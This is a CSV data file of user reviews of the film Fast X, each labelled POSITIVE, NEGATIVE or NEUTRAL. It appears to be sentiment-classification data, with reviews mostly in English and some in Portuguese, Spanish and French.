"May 22, 2023",NEGATIVE,"Bad dialog, super corny scenes, unrealistic stunts. It's so cringe worthy I kept wanting to leave but I wanted to see how this trainwreck was gonna end"
"May 22, 2023",NEGATIVE,I can't explain how horrid this movie was. Well almost all of them are minus the first two. LOL what a waste of time I'll never get back. All horrible actors.
"May 22, 2023",POSITIVE,great movie dint expect it to be this good
"May 22, 2023",POSITIVE,it was incredible!! dont want to say much so I don't spoil it for anyone
"May 22, 2023",POSITIVE,"The movie was very enjoyable, storyline showed consistency, the action matched the storyline very well and looking forward to seeing the conclusion the first of 2024."
"May 22, 2023",NEGATIVE,"I am a long time fast and furious fan from the time I was a kid I have loved these movies. I myself have built a fast and furious replica car. But I hope this review gets to the people who wrote this movie. People love fast and furious because of the cars, the racing, the story. I feel like the last two they lost sense of what these movies are all about. Bringing every character back from the dead taking away the emotion from the story, the fast themed music that went through out the series, turning street racers into super heros. Dude you guys are destroying the franchise. Atleast 5-7 involved awesome cars while doing heists and more realistic type race scenes. I still support this movie but hope you do a good send off of the last one and bring back what's important about the movies. Or atleast bring back physics man oh man focus on the story and the cars and not how many celebrities you can pack into one movie lol."
"May 22, 2023",POSITIVE,lots of action! (of course!) always good & they all rocked.  Never know what they come up with next but this cannot be the final one...right guys?!?❤👏🥰🌻🙏
"May 22, 2023",NEGATIVE,Guys just give it up! The whole thing has become so ridiculous! Then ROCK at the end after credits says “som bitch” LMAO
"May 22, 2023",POSITIVE,A lot of action and good character arcs
"May 22, 2023",POSITIVE,Great movie really waiting for the second part
"May 22, 2023",POSITIVE,I hate cliff hangers but it’s good
"May 22, 2023",POSITIVE,"Esse filme é um deleite para quem é um grande fã da franquia, Jason Momoa nós entrega o melhor vilão da saga, eu diria que o vilão dele é o ""coringa"" de velozes e furiosos."
"May 22, 2023",POSITIVE,Plenty of action...however did not care for the ending.
"May 22, 2023",NEGATIVE,"This movie was awful.  Such a disrespect to the franchise.  It made no sense, storyline was all over the place.  The end was wack.  This just goes to show you how greed keeps something going that should be put out to pasture.  The best part of the movie was the opening scene from the prior.  Just awful."
"May 22, 2023",NEGATIVE,Everything about this movie is stupid. The opening scene is ridiculous. I was over it 30 mins into the movie. Unfortunately I can’t get my money back. HORRIBLE MOVIE
"May 22, 2023",POSITIVE,This movie went almost Full circle. Jason Mamoa played his part. Great action scenes.
"May 22, 2023",NEUTRAL,"Too long.    Kind of silly.
Entertaining.
Glad I saw it."
"May 22, 2023",POSITIVE,Awesome movie non stop action and laughs Jason Momoa was great villain can’t wait for part 2 in 2025
"May 22, 2023",NEUTRAL,"Comedy 😂 was good enough except story. Nothing to say about splitting the finale 😡, garbage🗑️."
"May 22, 2023",POSITIVE,It was amazing and really good movie
"May 22, 2023",POSITIVE,"As I was watching the movie, my Fitbit was recording my heart rate, which was up and blood pressure took a jump!!! 
Its be a while I got a rush with a movie.....Bravo"
"May 22, 2023",NEUTRAL,"Fast X is an unabashed next step in this series' mission to depict escalating vehicular mania. It's certainly enjoyable and even thrilling at points, but it does lack some novelty. As Fast X speeds the Fast and Furious franchise into its final lap, it can't help but feel like we're going in circles.

Fast X follows Dominic Toretto (Vin Diesel) and his wife Letty (Michelle Rodriguez) as they raise their son away from their enemies and the battles that have taken up much of their time for decades. Dominic's friends and soldiers of the wheel-Roman (Tyrese Gibso), Tej (Ludacris), and Ramsey (Nathalie Emmanuel) -all go on a mission to Rome, Italy, for an underground government organization. However, the mission isn't real and both the agency and Dom's pals are duped by an old foe that emerges from the shadows to exact revenge on Dom and his family. This villain, Dante (Jason Momoa), threatens to break Dom's family into pieces, so the family must figure out how to save themselves from Dante and new government agents who have Dom in their crosshairs.

These Fast and Furious characters used to steal TVs off of moving trucks-now they save the Vatican. These movies succeed most when they know what they are and what you want. It's a rollercoaster, so at a certain point you just throw your hands up and enjoy the ride. Dominic Toretto is basically inhuman by now; nothing can kill him and he can bend the laws of reality and science to his will. Action is the primary draw of these films-story has become secondary as the saga of Dom and his band of street racers turned superheroes cruises into its 11th entry. Fast X, however, goes all in on plot, which feels like a miscalculation. Especially as the second half refuses to reach any kind of conclusion, barreling towards a silly cliffhanger that does little to maintain the stakes the first half establishes. None of the racers we've come to know and love are safe, but the way Fast X wraps up, it's hard not to feel like all of them are.

Jason Momoa is unbelievable in this movie as Dante. He's easily the best villain Dom and the crew have ever fought against. This level of gleeful, over-the-top evil is hard to find in any movie, but it's a gift in the heightened world of Fast and Furious. He gets all the movie's best laughs-you almost wish he would crush Dominic's world so we could watch him laugh, twirl, and dance as it all goes up in flames. John Cena's a lot of fun, too. He takes a page from Momoa's playbook, an action hero who loses the self-seriousness and has a good time playing uncle to Dom's young son. Tyrese Gibson is ever a delight as Roman. Gibson always has a lot fun with this role, and he understands exactly what energy he must bring to keep the franchise full of life. Practically every time he comes on screen, the audience erupts into laughter.

I give Fast X 3 out of 5 stars and recommend it for ages 12 to 18, for some language, frequent intense action and some graphic violence. Fast X zooms into theaters on May 19, 2023. Vroom vroom. By Benjamin P., KIDS FIRST!"
"May 22, 2023",POSITIVE,It's a dumb fun soap opera worthy of an ongoing comic book series. This isn't a jumping in point but should the tenth movie of a franchise (eleventh if you count Hobbs and Shaw) be a jumping in point? That would be like complaining season four of Lost was confusing for first time viewers. You know what these are and if you are in for that ride this one delivers big time with an unhinged fun as hell performance from Jason Mamoa.
"May 22, 2023",NEUTRAL,"Las peleas y las pesecuciones estaban bien hechas, el CGI a veces choca un poco y el final te deja esperando la siguiente pelicula.
No es de la mejor de la saga pero esta bien."
"May 22, 2023",NEUTRAL,"It won't be as incredible as its previous chapters were, I think maybe they don't have ""so much power"" to surprise us with the ""exploits"" anymore, but what it delivers in this 10th chapter of the saga was at least satisfactory to entertain us and say that it was better than ""F9"" at least. Jason Momoa's villain was the charm this time!"
"May 22, 2023",POSITIVE,This movie was a good asf good action and great plot
"May 22, 2023",NEUTRAL,Kept me on the edge of my seat! Emotional if you've followed these characters for the past 2 decades. A good summer movie with a fitting soundtrack and a unidimensional villain.
"May 22, 2023",NEGATIVE,The worst movie ever made. I am disappointed in Vin Diesel.  These movies have changed so much. Jason Momoa carried this one. Without him I wouldnt have even bothered to watch it.
"May 22, 2023",NEGATIVE,"In my opinion, ""Fast and Furious X"" left me with mixed feelings. Although the storyline, acting, cinematography, and certain stunts were impressive, there were some moments that made me question the logic behind them. While some moments were truly amazing, there were others that were questionable. However, I must admit that I still had a good time watching the movie."
"May 22, 2023",NEGATIVE,"Too many characters in the movie.  Unbelievable stunts and action scenes, it's science fiction superhero level. lol"
"May 22, 2023",NEGATIVE,The bs is thick in this one. I came expecting some over the top stunts but this one takes the cake. If you only like action this movie is for you but if you like believability don’t waste you time. The only thing these guys are missing is super powers.
"May 22, 2023",NEUTRAL,"It badly wanted to be like ""John Wick"", but just didn't quite get there for me. There are too many loose ends that weren't tied, a few implausible, confusing, and cheesey plot lines (bad guys become good, but it's a trick, as they were actually bad all along); too many new -- yet undeveloped --characters, only suiting parts of plotlines; forced dialogue in places; and, lacking any resolution, it feels like total bait to get us to see the next sequel. I'm all for theoretically left-open endings (thinking is good for humanity, as opposed to being spoon fed every conclusion to completeness), but in this case, they didn't even try. The villain also had no redeeming qualities and felt too absurd to believe, even lazy. A few redeeming qualities would humanize him and give us more conflicting emotions and nuance, much like dealing with people and even family members (whom we can't choose or avoid) in real life. Yet at times, it felt too slow and trying too hard to make us feel for the little boy and the vulnerable, albeit mostly random new characters, just to have any semblance of a purpose aside from the visuals. Also, Dom's car taking hit after hit and still left intact had me roll my eyes. Is it action or fantasy?

The good qualities about this movie include a star studded cast (2 main stars poached from GoT, along with butt-kicking Michelle Rodriguez and co. from the returning cast), stunning visuals and tech, adrenaline boosting action, and predictably, fast and cool rides and machines. With that in mind, it's a decent action flick to see, if action is the main purpose."
"May 22, 2023",POSITIVE,decent plot but waaay far fetched lol
"May 22, 2023",POSITIVE,It was fun to watch. Lots of action . Jason Mamoa is hilarious!!
"May 22, 2023",NEUTRAL,Inconclusive. I don't like serial movies where you have to wait a year of two for the conclusion.
"May 22, 2023",NEGATIVE,"I thought the movie was so unrealistic the stunts the action, they can supposedly take out dozens of people with guns and come out alive after each fight so unrealistic movie was pure cringe I liked Jason momoa in the movie I thought his character was funny and ironically kinda likeable the rest of the characters were cringe I thought the acting looked very cringe and forced no charisma except for Jason's character witch was the only likeable one the rest were so boring and they tried to be funny but literally no one was laughing in the cinema honestly the movie felt like it was never going to end worst film I've seen in a long time do not recommend also how is dominic torettos son Black with Afro hair his mother and father are white makes no sense think they're trying to bow to the woke mob also I feel like they're ruining the legacy of fast and furious it's not even about cars anymore it's all spy Cra* and undercover this undercover that secret locations etc 0 Stars don't waste your cash on this movie because I guarantee you'll want a refund."
"May 22, 2023",NEUTRAL,"Eu particularmente sou fã da trilogia original, pés no chão, o mundo das corridas de rua, perseguição da polícia, enredo voltado para essa parte, depois do 5 filme virou algo que não ruim mas na minha opinião perde a essência do que deveria ser o filme, o fato de personagens morrerem e voltarem é um ponto ruim. O Jason Malmoa rouba a cena no filme, as cenas de ação são mto boas, mas eu senti que personagens como o Han está la por conveniência não agrega nada. É uma boa experiência vou sempre curtir essa saga porque marcou minha infância."
"May 22, 2023",POSITIVE,"I loved seeing the crew back together (plus a couple surprises). I enjoyed the story and the fact that they toned it back on defying the law of physics (space, submarine battles etc). I feel like the franchise is back on the right track with family, cars, and the outlaw life being the center. Greatest fast movie since 5. This movie makes me want more again."
"May 22, 2023",POSITIVE,"Put your Brain in Neutral, and enjoy!"
"May 22, 2023",POSITIVE,It was the best one so far! Loved it
"May 22, 2023",POSITIVE,"It was a great movie, had plenty of twists and turns to keep you interested. 10/10 would recommend."
"May 22, 2023",POSITIVE,It has a lot of action. The plot is so so but yet the movie was entertaining.
"May 22, 2023",POSITIVE,"Very exciting movie, characters are all great, interesting storyline, can't wait for the next one!!!"
"May 22, 2023",POSITIVE,Love it but know it is not the end
"May 22, 2023",NEUTRAL,Mamoa’s Dante is the best onscreen Joker ever
"May 22, 2023",POSITIVE,Lots of action. Too many unanswered questions. Do I see another sequel?
"May 22, 2023",POSITIVE,"amazing way to keep this saga rolling! fan service at a 100%, John Cena slayed every bit of his performance in this film!"
"May 22, 2023",NEUTRAL,It kept my attention a little far fetched no one could do those stunts and actually survive but it was entertaining to say the least.
"May 22, 2023",NEUTRAL,Was so so. Did not care for Jason M... (whatever his name is)- His character or his acting. Just not real exciting movie from what I was expecting.
"May 22, 2023",POSITIVE,"Incrível. Se você curte velozes e furiosos , você não vai se arrepender de gastar seu ingresso com este filme. É a reunião de todo elenco principal para este desfecho magnícico de uma franquia de mais de dez filmes. Adorei."
"May 22, 2023",POSITIVE,Action packed. each screen was excellent.  I wanted to see more at the end. great movie
"May 22, 2023",NEGATIVE,"This movie had potential. I would give a spoiler alert but you can't spoil what's already rotten. It began with a thrilling and enchanting concept then ended with absurdly predictable and unrealistic nature inversion making it into just another in a long line of redundant and cliche' stories, with an emasculating narrative. Our characters of interest include, as usual: an exaggeratedly incompetent male protagonist, who repeatedly demonstrates himself as a bumbling failure, playing sidekick to an equally exaggeratedly superhuman heroine, who repeatedly saves the day, after her baffoon of a sidekick botches up every single situation they encounter.
Sloppy writing, at best, betraying an obvious Napoleon complex, on the part of the author.
By the... ..third?.. ...forth? (I lost count) time she saves him from himself, which was up to the last 10 minutes of the film (if you want to call it that): I was completely over it. Go watch tomb raider, with Angelina Jolie, instead. It's a more honest and slightly more balanced representation of the same story.
Two thumbs down. One finger up."
"May 22, 2023",NEGATIVE,"What a waste of time.  Bad acting, bad lines."
"May 22, 2023",POSITIVE,The way it ended. My heart hurts I want more.
"May 22, 2023",POSITIVE,"Incredible, as usual! They never disappoint"
"May 22, 2023",POSITIVE,Really exciting movie with great action and acting and brings back somewhat what the franchise was like back then.
"May 22, 2023",NEGATIVE,"Nada nuevo y bueno aquí, Jason Momoa con su actuación hizo que fuera aún más desastrosa."
"May 22, 2023",NEUTRAL,"This franchise has been stuck in neutral since its 6th iteration. A metaphor as corny and cliched as the movie's dialogue. A rinse and repeat that has surely run out of gas. Dang, I did it again."
"May 22, 2023",POSITIVE,Ending like John Wick 4 ! Great movie
"May 22, 2023",POSITIVE,The action was great !!!!
"May 22, 2023",NEGATIVE,Go back to fast and furious 1-4
"May 22, 2023",NEGATIVE,"Where Could I start ? so I think, one of the principal rule is: in order to make a movie you need an history to tell, I think this is the worst movie had been made from the history of high budget movie, not have an history, not have a charismatic characters, not have anything looks like real ! I think in the next fast and furious we'll able to see thanos or someone take random from marvel universe. Jesus christ this movie is a really horrible and cringe ! I would refund not my money, but the time I spent to see this commedy."
"May 22, 2023",NEUTRAL,The ending of the movie was so disappointing.  It left you hanging.  Enjoyed the action and car racing but the disappointing ending ruined the movie for me.
"May 22, 2023",POSITIVE,"I loved it! Sorry,  but it is not FINISHED!! AAH!"
"May 22, 2023",NEUTRAL,"It was kinda nice, was a lot grounded though I wish it was more logical. Villain's cool. I had a fun time watching it."
"May 22, 2023",NEGATIVE,"If you are going into Fast X with expectations of 1,2,3 and even 4 just forget it. Compared to Fast 9 this is just a large casting adding 3 or more characters into a story that is ridiculous. The women can take out every man they come across. Dom has super hero strength. Other than be a fantasy movie with no realism their is great news!!! The movie leaves you on a cliff hanger yay. So if you want the same crap from past movies you will enjoy this. 2 years until Fast 11 comes out answering that cliff hanger. 1 out of 5. Would of given a 0 but can't."
"May 22, 2023",NEGATIVE,Absolutely dreadful and waste of time. It is so sad that big budget films are produced simply to get fans back in seats for the same movie. This movie is awful. The premise makes no sense and the action sequences are unrealistic to say the least. No character development. I couldn't stay awake.
"May 22, 2023",POSITIVE,ACTION PACKED START TO FINISH
"May 22, 2023",POSITIVE,"Absolutely amazing, Dante the best villain in series, good job 👏 Glad to see all family again. Can't wait to see Fast X part 2🤩🔥. Solid 8/10"
"May 22, 2023",POSITIVE,I think this is the best one yet. Cant wait for 11
"May 22, 2023",NEGATIVE,corny movie and why cliffhanger to yet make another one with folks they keep bringing back from the dead.  enough already.
"May 22, 2023",NEUTRAL,"The film does a good job of highlighting the strengths of the previous entries. From the opening scene, this movie goes back to what made ""Fast Five"" and ""Furious 7"" so strong (two of my favorite films in the series). The characters have a depth that connects them, even the newly introduced villain.

One of the best elements of the ""Fast and the Furious"" franchise is the villains, with stars like Jason Statham (""The Italian Job""), Charlize Theron (""Mad Max: Fury Road"") and John Cena (""The Suicide Squad"") playing the last three antagonists. This film is no different, as Jason Momoa steps up to the plate. Though his character has an acquired taste, I was a fan by the end of this story. 

As this film is the 10th entry in the ""Fast and Furious"" world, there are some recycled moments. Some of these scenes help elevate the story, but others feel a bit lazy. Similarly, the franchise has a difficult time saying goodbye to characters. Trying to stay spoiler-free, my opinion is that once a character has an emotional send off, they need to stay gone. 

The dramatic moments are a tad melodramatic, and the humor never truly lands (other than the Jason Momoa scenes). The action sequences are long, which is typical in the world of Dominic Toretto. Unfortunately, there are an abundance of subplots that become convoluted and distracting from the core story. 

""Fast X"" is exactly what you would expect from the 10th entry in a movie about cars, guns and heists. The explosions are big, every situation is over-the-top and it seems to have more characters than ""Infinity War"". The film isn't perfect, but the franchise continues strong with 11th and 12th films already greenlit. 
Note: Take note of how many times the word ""family"" is used throughout the film. 

Best Character: Dante
Best Scene: ""See you again"" in the garage.
Best Song: ""My City"""
"May 22, 2023",POSITIVE,Grande toreto cacha cabros
"May 22, 2023",NEUTRAL,"J'ai trouvé le film pas mal , les scènes d'actions étaient super, parfois un peu folles , elles ont offert de la sensation . Le coeur de l'histoire était assez redondant, vous savez ""la famille"" etc... . Mais fast X en tant que premier film du dernier chapitre mérite que les derniers films de la saga soient plus surprenants que ca et phénoménales. Si non la saga Fast risque de finir sur une mauvaise note."
"May 22, 2023",NEGATIVE,"no ,this is not ff,this is an action movie with actors from ff..."
"May 22, 2023",NEGATIVE,"Un sinsentido de malos efectos digitales, sin fondo  ni forma...Simplemente ya no entretiene"
"May 22, 2023",POSITIVE,I loved the whole movie start to end nothing to dislike about it and recommend all fast and furious fans to go watch it in 4dx for the ultimate experience of there life
"May 22, 2023",POSITIVE,Lots of plot twists to go with the action
"May 22, 2023",NEUTRAL,It was a typical Fast and the furious movie.  Very far fetched and Jason Mamoa was definitely not the right person for the part he played. Wasnt really impressed with this movie.  Loved seeing Paul Walker flashbacks at the beginning. Miss him terribly
"May 22, 2023",POSITIVE,The movie was just what I expected - ACTION-FILLED!! Cant wait for part 2!!!!!
"May 22, 2023",POSITIVE,Must see movie. . . . I can’t wait for part 2 😌
"May 22, 2023",NEGATIVE,No one dies in this universe every character come back
"May 22, 2023",NEGATIVE,I liked the character that Jason mamoa played he was hilarious the movies was great but the ending wasn't all that good.
"May 22, 2023",NEUTRAL,I expected it to be a 5 and thought it was a 7 so that is good.
"May 22, 2023",POSITIVE,I love the movie full of action great film
"May 22, 2023",NEGATIVE,"It's action packed, but completely unbelievable action. Jason M. Is like a Heath Ledger Joker rip off bought on WISH. Overall not awful but it's hilarious"
"May 22, 2023",NEGATIVE,Too much fantasy… horrible ending now have to wait another 2-3 years for #11. Smh
"May 22, 2023",NEGATIVE,This is so far off what the series set out to do initially. Didn't come to see Vin Diesel as a superhero.
"May 22, 2023",POSITIVE,Everything from start to finish.
"May 22, 2023",POSITIVE,It was non stop action excellent
"May 22, 2023",POSITIVE,"Suspenful, exciting, climax was the best and all actors were on point.  So much h fun"
"May 22, 2023",POSITIVE,"Good action movie, with a cliffhanger."
"May 22, 2023",NEUTRAL,"This movie is entertaining enough but I think that they are stretching the franchise tooth thin and that desperate by adding every big name Actor in the movie.
I think it's time to retire this franchise."
"May 22, 2023",POSITIVE,Loved Everything About This Movie. The Way They Incorporated Paul Walker. Amazing Cast. Had Me On The Edge Of My Seat The Whole Movie.
"May 22, 2023",NEUTRAL,"I didn't like mamoa being a crazy dude and girlie. The crazy part he did well ... it was hard to see him in that kind of role based on his other roles, but the girly stuff was too much for me to deal with. Come on now. You can be crazy without being the opposite sex. The action was beyond belief as always totally delivered on that part."
"May 22, 2023",POSITIVE,I njoyed this movie the store is taking a twist and I look forward to see where it's going
"May 22, 2023",POSITIVE,"Well to be honest Fast saga and marvel movies were my gateway to the Hollywood and than to the world cinema if it weren't for this to movies franchises I would have never discover great movies from different parts of the world. 
And this both franchise means to me a lot I know they have some flaws in it but they hold a special place in my heart especially the Fast saga. 
This fast and furious movies help me to cope with the difficult time I was facing back than. 
Also the adrenaline rush I get after watching this movie is on next level when I was watching Fast X in theaters I was so edge of my seat even though I know that this all are overthetop action scenes but still I get goosebumps at time. 
For me Fast five is peak movie in this franchise and I think if they do the 11&12 movie right they can top this but fast five is one the most engaging action film in the franchise. 
Fast Ten your seat belts cause things are gonna be crazy in this movie.
Action of this film was great and I was at edge of rhe seat many times. 
Emotions in this film is about right amount. 
Vfx could have been better especially in the 3rd act . 
Pacing is good but the film doesn't end they just stop playing it. 
Storytelling wise it is better than the previous two and more grounded I like how they connected with the previous films. 
Screenplay is perfectly done at start it lags but they catches up. 
For Future expectations I don't have much but the way this movie ends I am so excited to the next ones if they manage to get RDJ in the future films than I would be thriller. 
Overall I liked this movie it was funny, goofy at time and packed with action. I know it is not class world cinema but a person who hates this mass action entertainer films probably hates fun too. 
Jason Mamoa killed it."
"May 22, 2023",NEGATIVE,Even Atomic Blonde and Jack Reacher could not save this sermonizing farce of a comedy. Cena probably asked to be killed off so he would not asked to do another one. Saving grace: special effects.
"May 22, 2023",POSITIVE,"Exactly what I wanted out of am over the top, amazingly ridiculous action movie. Can't wait for part 2!"
"May 22, 2023",POSITIVE,The ending was only problem
"May 22, 2023",POSITIVE,Fast X is everything movie theaters where created for & more. It isn't reinventing the wheel or trying to get awards. It's just good old fashioned entertainment mixed with some of the most fun & authenticity enjoyable acting I've seen on a screen in years. These people writing bad reviews want so badly to be edgy/ redefine what a good movie is that they miss whole point of why the fast franchise exists & the ultimate unwanted truth that these critics refuse to see… that Fast is the only real movie going experience left in a post Oscar Hollywood that is even coming close to the golden era of cinema. So Cheers 🥂& let's hope that soon the middle class will raise again & that these suits fighting over there statues of self praise will stop telling us what to like / watch & just let Us & tbh the fucking actors enjoy ourselves
"May 22, 2023",POSITIVE,Absolutely lived this movie with was jam packed with action. Can't wait for the next one
"May 22, 2023",POSITIVE,One of the best movies I've ever seen in all Fast and Furious with the exception of the 1st one.
"May 22, 2023",POSITIVE,"I didn't like that it left me wanting to see more, and now we have to wait another year or 2 for the conclusion!!"
"May 22, 2023",POSITIVE,kept me on the edge of my seat the whole time. I especially enjoyed the ending
"May 22, 2023",POSITIVE,Liked it so much that I saw it a 2nd time!! I hope the next one is coming soon!!
"May 22, 2023",NEGATIVE,"Tried to hard, bad ending!"
"May 22, 2023",NEUTRAL,"Fast X is a high-octane action movie that delivers on its promises of fast cars, explosions, and adrenaline-fueled thrills. However, the plot is thin and the characters lack depth, making it difficult to emotionally invest in their journeys. Overall, it's a fun ride for fans of the franchise but falls short of being a standout installment."
"May 22, 2023",POSITIVE,"Fantastic movie! Some sentimental moments, some funny moments, but with lots of action and creative stunts. Just when you think it's over with a HUGE Cliffhanger, there's one more Great surprise that made our audience break out in applause. Definitely a must see on the big screen."
"May 22, 2023",NEUTRAL,"Lots of great action, but the storyline was confusing. It's being sold as the last one of the franchise, but there are a multitude of unanswered questions."
"May 22, 2023",POSITIVE,It was action packed a good pliot but went a little to far with some of car stunts but it's just a movie
"May 22, 2023",POSITIVE,Loved it. Been watching these since they 1st came out. They take me to the edge of my seat everytime & feel such a Rush. Left me hanging @ the end and will be looking for the 2nd partCant be soon enough
"May 22, 2023",NEGATIVE,"This one really misses the mark by a long shot. Theres no essence of what makes these films great in this one. First of all, Jason Mamoa's character is one of the worst characters ever portrayed on film, I couldn't stand watching him and I feel embarrassed for him. The plot seems like a fine enough plot for a film like this, for the most part its…. Okay? But the 4 or so sub plots happening simultaneously are not only wildly boring, they're completely unnecessary. I don't know who wrote the dialogue but it felt so amateur, and when no one is giving exposition the scenes are drowned with constant fist fights or shoot outs, its so repetitive and ridiculous. The driving sequences have become boring and most if not all are spoiled in the trailers. The CGI is video game quality. The interactions between characters feel like actors delivering lines, especially from Vin Diesel. I don't know why they refuse to have Brian in these films because at this point its just insane that he is not present, it doesn't even make sense anymore now that Mia is back in these films. Why is she the only one attending the BBQs and not the 3 of them (husband, wife and son) as a family? Especially when they teased him at the end of Fast 9. It feels really awkward at this point. I'm sure his brother at the very least would feel honoured to step into the character. Nothing really good to say about this film to be honest."
"May 22, 2023",NEGATIVE,"Wouldn't see it again, The Action was ok but The Ending was worst ending to a movie I have seen in a long time obviously there's going to be a sequel just on what happened at the end."
"May 22, 2023",NEGATIVE,"They are all too old for this, and they definitely look it. Multiple location sites. Numerous actors with a chaotic all over the place storyline that is a bit much to piece together. The movie just didn't hold up as well as previous movies in the franchise, there was just too much going on.
Pete Davidson? Jesus Christ. Rome and Tej tussling? It's clear the writers didn't have anything worthy.
Jason Momoa's first scene came off as extremely stiff and uncomfortable. It would've been nice to actually see him in the Fast Five movie instead of them making up this new storyline and character YEARS later. His behavior and mannerisms were a bit confusing. He gave off flimsy, flamboyant, gypsy, genie joker vibes .. Is the character gay or just extremely sassy?
The scraggly wet mop on Letty's head is too matronly and homely, looks horrible for her.
The best part and character of the movie may just have been Dom's son, Little B."
"May 22, 2023",POSITIVE,"Las escenas de carros no son tan reales
Las escenas de jason momoa son muy basicas y su personaje necesitaba mas desarrolo"
"May 22, 2023",NEUTRAL,"I think the best character in the play is dante. Although he is not very eye-catching, he is already very good for other characters. We also know that the faf series violates the laws of god and gravity, even if the car falls from the plane, it's okay, remember to see post credit."
"May 22, 2023",POSITIVE,"As always, the stunts and cinematography are on point. The storyline went a little dark, but overall, it's a good movie.  Waiting on F & F XI"
"May 22, 2023",POSITIVE,"Loved it! Action through out - left on a great cliffhanger! I'd go see it again. and again, and again."
"May 22, 2023",POSITIVE,The most self aware and genre savvy installment in the series yet. Mimoa subverts the self serious villain trope typical of the franchise while remaining deranged enough to strike fear into the audience.
"May 22, 2023",POSITIVE,Pretty Good Movie. I f you like action movies you will like this one... not going to spoil the movie for you... enjoy!!
"May 22, 2023",NEGATIVE,"Worst movie ever.
I've never seen such bizarre, stupid script, it's disrespectful to RJ once again.
I wasted time.
All that was missing was Toretto's car becoming an Autobot.

FF1 is the best ever. This one lived up to its name."
"May 22, 2023",NEUTRAL,"Too many action scenes, but too unrealistic. I think Newton will be angry. LOL. If you want to get eye-catching action scenes, you have to see it in the theater. Should try."
"May 22, 2023",NEGATIVE,"It's like a cocktail of the worst possible ways to create a movie
Terrible unconnected story line
Dude is boxing a sandbag 5 seconds later he is already arrested and siting in a SWAT unit
Woman fighting with other woman and when she escapes she's already in Antaractica 
A ball of steel rorating in Rome while crashing cars is the main idea of the movie

Dude kissing a cross is 40% of the abstract

Terrible cinematics, terrible sound, terrible music, terrible acting one moment a scene based on Resident Evil, later a Sci-Fi scene of robotics fixing woman with laser
Terrible light effects
Terrible characters

Basically this blend of disaster forced us to leave the cinema 1 hour earlier than planned

Disgusting"
"May 22, 2023",NEGATIVE,Jason Mamoa's character was poorly written.
"May 22, 2023",POSITIVE,"Really good, dumb entertainment, I just wish Part 2 would come out next year instead"
"May 22, 2023",POSITIVE,Very action packed! Jason did his thing and should be considered to be the next Joker! StY after the first part of the credits for bonus content!
"May 22, 2023",POSITIVE,Non-stop action. Characters played various roles than previous series’.  Absolutely loved it!!!
"May 22, 2023",POSITIVE,"the plot is good, it has a bit of wear because it is something similar to the previous ones but its new characters make it a new experience"
"May 22, 2023",NEGATIVE,Bloated garish absurd we stayed hoping it would get better. It does not.
"May 22, 2023",POSITIVE,Really good. I cant wait for the next.
"May 22, 2023",NEGATIVE,Its like the movie ended without finishing the assignment.. didnt like it at all
"May 22, 2023",POSITIVE,Although situations are completely unrealistic it was good. One of the better FF I can say I watched. 11 should be exciting.
"May 22, 2023",POSITIVE,"Gotta do better on the ending, so many unknowns up in the air."
"May 22, 2023",NEGATIVE,I hate how they have completely ruined their franchise its not about cars anymore and vin diesel is literally an avenger in the movie these new movies suck
"May 22, 2023",POSITIVE,"A touch of nostalgia, a lot of dumb fun, action and even a good little plot twist in the end. However, the ending should've been a bit more finite then the hastened cut to black."
"May 22, 2023",NEGATIVE,"With the budget going into overstimulating effects and the facility's to balance one liner humor with self serious stakes, this one definitely gets an X in the franchise."
"May 22, 2023",NEGATIVE,"Low expectations going in, felt as though the previous installment crossed the line between entertainment and absurdity, which in the past they've just about managed to tread, and was expecting more of the same from this. They dialled it in slightly but it's still mind-numbingly silly for the majority of it's bloated run-time, but if you're after non-stop (oftentimes questionable CGI) action sequences for two and a half hours then you'll get what you pay for. Made me forget that this was meant to be a two-part film, the cliffhanger at the end was almost laughable trying to ""set the stakes"" for part two, the franchise over the last three films has proved that there's no actual danger to any of the main characters, they can just inexpicably bring them back - even if we see them die - and explain how they miraculously survived through a lazily-written exposition piece (can't wait to see what they come up with to make sense of the final scene of this one). 

The bright point of this film, which I was dreading going in based off what I'd seen from the trailers, was Jason Momoa as the eccentric, flamboyant, supervillain-esque antagonist. He clearly had a lot of fun in the role and brings a refreshing change to Charlize Theron's bland, emotionless hacker, who thankfully takes a backseat role (but is still around so we're not done with her yet unfortunately). He'll be the main reason people tune in for the next one.

Like with most ""cinematic universes"" that we're endlessly subjected to these days, there's been an apathetic feeling towards this franchise for a long time, but they're easy to watch nostalgia trips so we'll pay to keep seeing them, even though the quality is likely to decline each time. We're already down the rabbit hole, so we might as well begrudgingly see it out to it's end (if Vin Diesel makes up his mind on when that is)."
"May 22, 2023",NEUTRAL,"A lot going on at once in this movie, you really need to pay close attention. A little darker than the other movies in the franchise, but I didn't mind that... Added to the suspense."
"May 22, 2023",POSITIVE,Me and my Grandsons LOVED IT ALL
"May 22, 2023",POSITIVE,Movie was amazing and one of the best fast & furious movie since the 7th installment. loved the action and storyline.
"May 22, 2023",POSITIVE,Dom lifting the mustang didnt feel real
"May 22, 2023",POSITIVE,Very entertaining movie with some crazy stunts. Some were over the top but overall it was good! Sound design was probably one of the best parts of the film.  Very well done.
"May 22, 2023",NEGATIVE,"Should've never let Lettier direct the Incredible Hulk - this movie has Aquaman, Captain Marvel, Groot, Wonder-woman- dc marvel crossover flick we didn't need"
"May 22, 2023",POSITIVE,"I didn't want it to end! Jason Mamoa is brilliant, other than the original this is the only film in the franchise I'll rewatch, and it's not for the action sequences, it's for Mamoa's character.

Ridiculously fun."
"May 22, 2023",POSITIVE,"They know it’s so ridiculous and they still continue to create these insanely impossible, cheesy, yet absolutely hilarious movies. I thought it was so funny and entertaining throughout the whole movie & didn’t drag on at all for me. Like others have said, go in without wanting to put much thought into it, but be ready for an action movie!"
"May 22, 2023",POSITIVE,Best one since Fast 5
"May 22, 2023",NEGATIVE,Great action terrible acting and lame ending. C'mon that was a wreck.
"May 22, 2023",POSITIVE,Easily one of the best fast and furious movies.
"May 22, 2023",NEUTRAL,It was a coo movie but the storyline was very choppy with different story lines playing out and the ending could’ve been way better
"May 22, 2023",POSITIVE,Better than F9. It seems that I have to make this longer but the first sentence is my review of this movie. Thank you very much.
"May 22, 2023",NEGATIVE,"Very simple and flaky story... The duologue literally tells you information you just discovered or understand by watching. The bond between the actors and character setup is just really a long stretch. Verry little comedic relief, everyone just seems robotic with a single facial expression. Oh and in this movie your in for a treat because Van Diesel has two facial expressions in this one, Kinda and understand father/family face and classic serious face. It ended on another cliffhanger for another to comout again... It's age shows... By a lot."
"May 22, 2023",NEGATIVE,The script was patchy...and a unnatural mix of avenger cast with fast and furious franchise with 2 mins dedicated to each character for no apparent reason. This was probably the worst of all fast n furious.
"May 22, 2023",POSITIVE,Action but disappointed in ending
